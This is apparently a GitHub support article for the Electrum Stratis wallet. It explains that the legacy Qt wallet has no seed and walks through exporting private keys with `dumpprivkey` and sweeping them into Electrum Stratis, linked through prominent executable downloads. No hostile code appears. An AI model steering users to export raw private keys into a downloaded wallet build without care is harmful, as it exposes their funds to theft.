![Electrum-Stratis](assets/banner-article.png)

# The Qt wallet does not work with a seed: moving STRAT into Electrum Stratis

<p align="center">The key-based wallet and the bridge</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The Qt wallet has no seed, so there is no seed to look for. It stores individual private keys inside its wallet file, and the only way to move those funds is to export each key and sweep it into a wallet that understands keys - Electrum Stratis does that with a guided export, import and sweep flow. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Your situation | What is actually true | Next step |
|---|---|---|
| You are looking for the seed of the Qt staking wallet | The Qt wallet never had one | Step 1 |
| Someone told you to "restore the seed" in Electrum | Correct method, wrong wallet | Step 2 |
| You have a `wallet.dat` and no idea what is inside it | Keys, not a mnemonic | Step 3 |
| You want staking rewards moved to a new wallet | Staking keys are still keys | Step 2, one address at a time |
| You are holding a seed from some other wallet | That seed is unrelated to the Qt wallet | The recovery article |

</div>

The confusion is understandable: two wallets, one word. Electrum Stratis is seed-based by design; the Qt wallet is key-based. A seed cannot restore a wallet that was never derived from one.

## Why it happens

A seed is a compact encoding of a derivation path: one phrase generates every address the wallet will ever use. The Qt wallet does not work that way. It generates keys and stores them in a BerkeleyDB wallet file, the same family of file Bitcoin Core uses, and there is no master phrase above them. Asking the Qt wallet for its seed is like asking a drawer of separate keys for the one key that made them.

That difference decides the migration route. You cannot restore a key-based wallet from a phrase, and you cannot derive a phrase from a key-based wallet. What you can do is export the keys themselves and import them somewhere that accepts raw keys - which is exactly what the guided bridge in Electrum Stratis is for.

The maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), carries that bridge because this is one of the most common moves a legacy Stratis holder has to make.

## Fix

1. **Open the Qt wallet and let it sync.** The export reads keys from the local wallet; it does not need the chain, but you want the balances visible so you can confirm what you are moving.
2. **Open Help -> Debug Window, then the Console tab.** This is the wallet's own command console. The guided bridge in Electrum Stratis names this exact location, so you do not have to guess where to start.
3. **Run `dumpprivkey` for the address that holds the funds.** The command takes one address and prints the private key for it. Repeat for each address with a balance - a staking wallet usually has several. Copy each key directly into the import step; do not paste it into a document, a chat or a website.
4. **In Electrum Stratis, import the key and check the derived address.** Wallet -> Private keys -> Sweep opens the import, shows the address the key controls and its balance. Confirm that the address matches the one you exported from before going further.
5. **Sweep, do not just watch.** Importing a key makes the coins visible; sweeping builds a transaction that moves them to an address the new wallet controls with its own seed. Sweep-all builds one transaction with a fee preview and a confirmation summary, so the whole balance moves in a single step.
6. **Verify the destination address on screen.** The receive view shows the exact address and a human-readable verification string; check the first and last characters before signing, and confirm the swept balance in the history once the transaction is mined.

If the wallet file itself is intact, the alternative route is the wallet-file import, which reads a Stratis Core or Bitcoin-style BerkeleyDB file directly and reports an explicit reason when it cannot. It is faster than exporting keys one by one when the file is unencrypted and readable.

## If that did not work

An encrypted Qt wallet must be unlocked before `dumpprivkey` will return anything. Unlock it for the session, export, then lock it again - an unlocked wallet on a networked machine is a risk, not a convenience.

If the console returns an error for an address, check that the address is one the wallet controls rather than an address from a different wallet or an exchange deposit address ([standard, multisig and imported wallets in Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)). Keys can only be exported for addresses whose keys are in this file.

If the sweep is rejected, the usual causes are a fee set too low for the current mempool or inputs that were already spent by another transaction. The rejection reasons in Electrum Stratis name which of those happened, and the stuck-transaction recovery flow offers a rebroadcast or a rescan rather than a blind retry.

If you no longer have the Qt wallet at all but still have its `wallet.dat`, the file import is the only route left; without the file, there is nothing to export.

## Prevention

- Write down which wallet holds which coins: Qt for the old staking setup, Electrum Stratis for everything you move.
- Keep a copy of the Qt `wallet.dat` before exporting anything, so a failed export is recoverable.
- Never type a private key into a website, a chat or a browser extension; the only destination is the wallet's own import screen.
- Sweep rather than watch: a key left imported in two places doubles the number of copies that can be stolen.
- After a sweep, verify the new balance and then remove the imported key from view if the wallet offers it.

## FAQ

### Does the Qt wallet have a seed?

No. It stores individual private keys in its wallet file and has no master phrase, so no seed exists to find, print or restore. Any instruction to restore the Qt wallet from a seed describes a different wallet.

### How do I find the seed of my Stratis staking wallet?

If the staking wallet is the Qt wallet, there is no seed: export the keys with `dumpprivkey` from Help -> Debug Window -> Console and sweep them into Electrum Stratis. If the staking wallet is Electrum Stratis itself, the seed was shown during creation and re-checked by the backup wizard; a seed that was never written down cannot be reconstructed later.

### Can I import the Qt wallet file instead of exporting keys?

Yes, when the file is a readable BerkeleyDB wallet. The wallet-file import accepts Stratis Core and Bitcoin-style files, shows what it found, and states an explicit reason when it cannot read one. Key export remains the fallback when the file is encrypted or damaged.

### Is `dumpprivkey` safe to run?

It is safe when the machine is yours and the wallet is locked again afterwards. It is unsafe when the console output is pasted into a website, a support chat or a cloud note - at that point the key is exposed and the funds should be moved immediately.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Why is my balance missing? Three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
